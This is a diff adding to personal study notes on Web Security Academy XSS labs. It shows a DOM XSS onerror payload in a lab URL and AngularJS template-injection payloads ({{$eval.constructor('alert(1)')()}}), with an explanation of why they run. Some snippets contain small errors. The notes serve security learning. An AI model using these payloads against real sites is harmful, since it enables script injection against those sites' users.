@@ -472,8 +472,37 @@ So, finally we can escalate like that
 
 https://0af300d3047fb3828091309400680083.web-security-academy.net/#<img src=1 onerror(alert('xxx')>
 _______________________________________________________________________________________________________________________________________________________________________________________________
+DOM XSS in AngularJS expression
+--------------------------------
+<head>
+	<script src="https://angular.js">
 
+</head>
 
+<body ng-app="myApp" ng-controller="myCtrl">
+
+	{{firtname}}
+	{{1+1}}
+	{{$eval.constructor('alert(1)')()}}
+
+</body>
+
+<script>
+	var app= angular.module("myApp",[]);
+	app.controller('myCtrl',function($scope){
+		$scope.firstname= "Adman";
+	});
+	
+</script>
+	
+It will display --> Adman 2
+
+app.controller('myCtrl',function($scope) > that means
+
+The function passed to the controller has a $scope parameter, which is the application object (the binding part between the HTML (view) and the JavaScript (controller)).
+
+Therefore
+You can use both {{$on.constructor('alert(1)')()}} or {{$eval.constructor('alert(1)')()}} > to get alert() message.
 
 
 
